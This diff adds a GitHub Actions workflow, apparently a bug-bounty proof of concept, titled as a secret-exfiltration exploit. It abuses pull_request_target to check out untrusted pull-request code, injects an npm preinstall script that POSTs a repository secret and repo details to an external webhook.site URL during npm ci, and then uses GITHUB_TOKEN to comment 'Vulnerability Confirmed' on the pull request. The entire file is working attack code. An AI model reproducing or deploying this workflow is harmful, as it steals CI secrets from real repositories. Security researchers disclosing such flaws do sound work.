@@ -1,0 +1,51 @@
+name: POC - Secret Exfiltration via npm ci
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    environment: staging
+    permissions:
+      pull-requests: write
+    
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      
+      - uses: actions/setup-node@v4
+        with:
+          node-version-file: .nvmrc
+      
+      - name: Inject malicious preinstall script
+        run: |
+          # Add preinstall script to package.json
+          if [ -f package.json ]; then
+            node -e '
+              const pkg = require("./package.json");
+              pkg.scripts = pkg.scripts || {};
+              pkg.scripts.preinstall = "node -e \"fetch(process.env.WEBHOOK, {method:\\\"POST\\\",body:JSON.stringify({secret:process.env.TEST_HACKERONE,repo:process.env.GITHUB_REPOSITORY,pr:process.env.PR_NUMBER})})\"";
+              require("fs").writeFileSync("package.json", JSON.stringify(pkg, null, 2));
+            '
+          else
+            echo '{"scripts":{"preinstall":"node -e \"fetch(process.env.WEBHOOK,{method:\\\"POST\\\",body:JSON.stringify({secret:process.env.TEST_HACKERONE})})\""}}' > package.json
+          fi
+          echo "PR_NUMBER=${{ github.event.pull_request.number }}" >> $GITHUB_ENV
+      
+      - name: Execute npm ci (runs malicious code)
+        run: npm ci
+        env:
+          TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}
+          WEBHOOK: "https://webhook.site/60f458ac-ded0-4de9-91d1-4de73c5e0f65"
+      
+      - name: Post proof on PR
+        if: always()
+        run: |
+          curl -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
+            -d '{"body":"✅ **Vulnerability Confirmed** - Successfully executed arbitrary code during `npm ci` and exfiltrated `TEST_HACKERONE` secret to external webhook"}'
